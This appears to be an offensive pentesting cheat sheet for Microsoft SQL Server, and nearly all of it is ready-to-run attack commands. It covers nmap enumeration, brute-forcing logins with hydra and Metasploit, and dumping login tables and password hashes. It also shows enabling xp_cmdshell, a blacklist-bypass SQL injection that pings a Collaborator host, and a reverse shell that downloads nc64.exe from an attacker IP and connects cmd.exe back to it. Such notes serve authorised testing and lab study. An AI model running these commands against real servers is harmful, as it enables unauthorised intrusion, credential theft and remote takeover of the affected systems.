---
description: MSSQL - Microsoft SQL service. typically runs on TCP port 1433.
---

# MSSQL

## Enumeration

```
nmap [IP]
nmap --script ms-sql-info -p 1433 [IP]
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [IP]
```

## Password attack

```
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passwd=/root/Desktop/wordlist/100-common-passwords.txt [IP]
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt [IP] mssql
hydra -l sa –P /root/Desktop/pass.txt [IP] mssql

##Metasploit:
use auxiliary/scanner/mssql/mssql_login
msf auxiliary(scanner/mssql/mssql_login) > set rhosts [IP]
msf auxiliary(scanner/mssql/mssql_login) > set user_file /root/Desktop/user.txt
msf auxiliary(scanner/mssql/mssql_login) > set pass_file /root/Desktop/pass.txt
msf auxiliary(scanner/mssql/mssql_login) > set stop_on_success true
msf auxiliary(scanner/mssql/mssql_login) > run
```

## Extracting users

```
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=Password123,ms-sql-query.query="SELECT * FROM master..syslogins" [IP] -oN output.txt
```

## Dump hashes

```
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=Password123 [IP]
```

## CMD Shell

```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=Password123,ms-sql-xp-cmdshell.cmd="ipconfig" [IP]
```

### Enable xp\_cmdshell - manual

```
//this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

//Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

//Bypass blackisted "EXEC xp_cmdshell"
‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —
```

Connect to MSSQL instance with impacket-mssqlclient

```
impacket-mssqlclient machine_name/user@[IP] -windows-auth
```



## Reverse shell

Download a netcat file to the remote server&#x20;

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```
